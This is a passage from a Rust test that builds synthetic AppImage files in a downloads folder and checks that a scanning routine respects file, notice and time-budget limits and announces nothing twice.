            &build::type2(
                &build::normal_squash().file("/n", format!("{n}")).build(),
                &[],
                &[],
            ),
        );
    }
    let cfg = Config {
        max_files: 1,
        max_notices: 4,
        ..fast()
    };
    let mut n = Notices::default();
    let r = run_check(&dl, &state, &cfg, &mut n, &mut Opened::default());
    assert_eq!(r.notified.len(), 3, "{r:?}");
    // And a file that arrives after a run is picked up by the next one only
    // when it is new: nothing is announced twice.
    let r = run_check(
        &dl,
        &state,
        &cfg,
        &mut Notices::default(),
        &mut Opened::default(),
    );
    assert!(r.notified.is_empty());
    // The budget stops new work.
    build::write(
        &dl,
        "Late.AppImage",
        &build::type2(&build::normal_squash().file("/late", "x").build(), &[], &[]),
    );
    let none = Config {
        budget: Duration::ZERO,
        ..fast()
    };
    let r = run_check(
        &dl,
        &state,
        &none,
        &mut Notices::default(),
        &mut Opened::default(),
    );
    assert!(r.notified.is_empty());
}
